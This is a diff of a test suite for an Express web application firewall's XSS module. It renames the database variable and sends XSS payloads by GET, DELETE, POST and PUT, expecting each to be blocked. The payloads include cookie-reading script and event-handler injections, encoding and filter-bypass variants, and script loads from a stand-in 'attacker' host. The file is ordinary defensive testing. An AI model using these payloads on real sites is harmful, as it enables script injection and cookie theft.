@@ -1,5 +1,5 @@
 describe("xss", function() {
-    var server, testdb, request, waf;
+    var server, emudb, request, waf;
 
     it("should load properly", function(done){
         var express = require('express');
@@ -8,15 +8,18 @@ describe("xss", function() {
         var bodyParser = require('body-parser');
 
         var TestDB = require('./../database/emulated-db');
-        testdb = new TestDB();
+        emudb = new TestDB();
 
         var app = express();
 
         var ExpressWaf = require('./../express-waf').ExpressWAF;
         var BLOCK_TIME = 1000;
         waf = new ExpressWaf({
-            db: testdb,
-            blockTime: BLOCK_TIME
+            blocker: {
+                db: emudb,
+                blockTime: BLOCK_TIME
+            },
+            log: false
         });
 
         waf.addModule('xss-module', {}, function(error) {
@@ -60,7 +63,7 @@ describe("xss", function() {
     it("testGetSimpleXSS", function (done) {
         request.get('http://localhost:8080/spec?user=<script>alert(123)</script>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -69,7 +72,7 @@ describe("xss", function() {
     it("testGetTagAttributeValue", function (done) {
         request.get('http://localhost:8080/?user=" onfocus="alert(document.cookie)', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -78,7 +81,7 @@ describe("xss", function() {
     it("testGetDifferentSyntaxOrEncoding_1", function (done) {
         request.get('http://localhost:8080/?user="><script >alert(document.cookie)</script >', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -87,7 +90,7 @@ describe("xss", function() {
     it("testGetDifferentSyntaxOrEncoding_2", function (done) {
         request.get('http://localhost:8080/?user="><ScRiPt>alert(document.cookie)</ScRiPt>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -96,7 +99,7 @@ describe("xss", function() {
     it("testGetDifferentSyntaxOrEncoding_3", function (done) {
         request.get('http://localhost:8080/?user="%3cscript%3ealert(document.cookie)%3c/script%3e', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -105,7 +108,7 @@ describe("xss", function() {
     it("testGetNonRecursiveFiltering", function (done) {
         request.get('http://localhost:8080/?user=<scr<script>ipt>alert(document.cookie)</script>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -114,7 +117,7 @@ describe("xss", function() {
     it("testGetIncludingExternalScripts_1", function (done) {
         request.get('http://localhost:8080/?user=<script src="http://attacker/xss-modules.js"></script>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -123,7 +126,7 @@ describe("xss", function() {
     it("testGetIncludingExternalScripts_2", function (done) {
         request.get('http://localhost:8080/?user=<SCRIPT%20a=">"%20SRC="http://attacker/xss-modules.js"></SCRIPT>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -132,7 +135,7 @@ describe("xss", function() {
     it("testGetHTTPParameterPollution", function (done) {
         request.get('http://localhost:8080/?user=<script&param=>[...]</&param=script>"></SCRIPT>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -148,7 +151,7 @@ describe("xss", function() {
     it("testDeleteSimpleXSS", function (done) {
         request.del('http://localhost:8080/spec?user=<script>alert(123)</script>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -157,7 +160,7 @@ describe("xss", function() {
     it("testDeleteTagAttributeValue", function (done) {
         request.del('http://localhost:8080/?user=" onfocus="alert(document.cookie)', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -166,7 +169,7 @@ describe("xss", function() {
     it("testDeleteDifferentSyntaxOrEncoding_1", function (done) {
         request.del('http://localhost:8080/?user="><script >alert(document.cookie)</script >', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -175,7 +178,7 @@ describe("xss", function() {
     it("testDeleteDifferentSyntaxOrEncoding_2", function (done) {
         request.del('http://localhost:8080/?user="><ScRiPt>alert(document.cookie)</ScRiPt>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -184,7 +187,7 @@ describe("xss", function() {
     it("testDeleteDifferentSyntaxOrEncoding_3", function (done) {
         request.del('http://localhost:8080/?user="%3cscript%3ealert(document.cookie)%3c/script%3e', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -193,7 +196,7 @@ describe("xss", function() {
     it("testDeleteNonRecursiveFiltering", function (done) {
         request.del('http://localhost:8080/?user=<scr<script>ipt>alert(document.cookie)</script>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -202,7 +205,7 @@ describe("xss", function() {
     it("testDeleteIncludingExternalScripts_1", function (done) {
         request.del('http://localhost:8080/?user=<script src="http://attacker/xss-modules.js"></script>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -211,7 +214,7 @@ describe("xss", function() {
     it("testDeleteIncludingExternalScripts_2", function (done) {
         request.del('http://localhost:8080/?user=<SCRIPT%20a=">"%20SRC="http://attacker/xss-modules.js', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -220,7 +223,7 @@ describe("xss", function() {
     it("testDeleteHTTPParameterPollution", function (done) {
         request.del('http://localhost:8080/?user=<script&param=>[...]</&param=script>"></SCRIPT>', function (err, res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -236,7 +239,7 @@ describe("xss", function() {
     it("testPostSimpleXSS", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "<script>alert(123)</script>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -245,7 +248,7 @@ describe("xss", function() {
     it("testPostTagAttributeValue", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "\" onfocus=\"alert(document.cookie)" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -254,7 +257,7 @@ describe("xss", function() {
     it("testPostDifferentSyntaxOrEncoding_1", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "><script >alert(document.cookie)</script >" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -263,7 +266,7 @@ describe("xss", function() {
     it("testPostDifferentSyntaxOrEncoding_2", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "\"><ScRiPt>alert(document.cookie)</ScRiPt>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -272,7 +275,7 @@ describe("xss", function() {
     it("testPostDifferentSyntaxOrEncoding_3", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "\"%3cscript%3ealert(document.cookie)%3c/script%3e" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -281,7 +284,7 @@ describe("xss", function() {
     it("testPostNonRecursiveFiltering", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "<scr<script>ipt>alert(document.cookie)</script>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -290,7 +293,7 @@ describe("xss", function() {
     it("testPostIncludingExternalScripts_1", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "<script src=\"http://attacker/xss-modules.js\"></script>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -299,7 +302,7 @@ describe("xss", function() {
     it("testPostIncludingExternalScripts_2", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss-modules.js\"></SCRIPT> " } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -308,7 +311,7 @@ describe("xss", function() {
     it("testPostHTTPParameterPollution", function (done) {
         request.post('http://localhost:8080/spec', { form: { user: "<script&param=>[...]</&param=script>\"></SCRIPT> " } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -324,7 +327,7 @@ describe("xss", function() {
     it("testPutSimpleXSS", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "<script>alert(123)</script>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -333,7 +336,7 @@ describe("xss", function() {
     it("testPutTagAttributeValue", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "\" onfocus=\"alert(document.cookie)" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -342,7 +345,7 @@ describe("xss", function() {
     it("testPutDifferentSyntaxOrEncoding_1", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "><script >alert(document.cookie)</script >" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -351,7 +354,7 @@ describe("xss", function() {
     it("testPutDifferentSyntaxOrEncoding_2", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "\"><ScRiPt>alert(document.cookie)</ScRiPt>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -360,7 +363,7 @@ describe("xss", function() {
     it("testPutDifferentSyntaxOrEncoding_3", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "\"%3cscript%3ealert(document.cookie)%3c/script%3e" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -369,7 +372,7 @@ describe("xss", function() {
     it("testPutNonRecursiveFiltering", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "<scr<script>ipt>alert(document.cookie)</script>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -378,7 +381,7 @@ describe("xss", function() {
     it("testPutIncludingExternalScripts_1", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "<script src=\"http://attacker/xss-modules.js\"></script>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -387,7 +390,7 @@ describe("xss", function() {
     it("testPutIncludingExternalScripts_2", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss-modules.js\"></SCRIPT>" } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
@@ -396,7 +399,7 @@ describe("xss", function() {
     it("testPutHTTPParameterPollution", function (done) {
         request.put('http://localhost:8080/spec', { form: { user: "<script&param=>[...]</&param=script>\"></SCRIPT> " } }).on('response', function(res) {
             expect(res.statusCode).toEqual(403);
-            testdb.remove("127.0.0.1", function () {
+            emudb.remove("127.0.0.1", function () {
                 done();
             });
         });
